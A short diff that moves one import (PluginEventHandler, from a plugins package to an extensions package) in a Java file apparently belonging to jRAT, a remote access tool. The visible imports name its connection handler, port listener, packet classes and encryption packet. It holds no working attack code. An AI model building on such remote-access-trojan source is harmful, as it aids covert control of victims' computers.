@@ -15,6 +15,7 @@ import java.util.Random;
 import javax.swing.ImageIcon;
 
 import pro.jrat.exceptions.CloseException;
+import pro.jrat.extensions.PluginEventHandler;
 import pro.jrat.ip2c.Country;
 import pro.jrat.net.ConnectionHandler;
 import pro.jrat.net.PortListener;
@@ -22,7 +23,6 @@ import pro.jrat.packets.incoming.IncomingPackets;
 import pro.jrat.packets.outgoing.AbstractOutgoingPacket;
 import pro.jrat.packets.outgoing.Packet0Ping;
 import pro.jrat.packets.outgoing.Packet99Encryption;
-import pro.jrat.plugins.PluginEventHandler;
 import pro.jrat.settings.Settings;
 import pro.jrat.ui.frames.Frame;
 import pro.jrat.ui.panels.PanelMainLog;
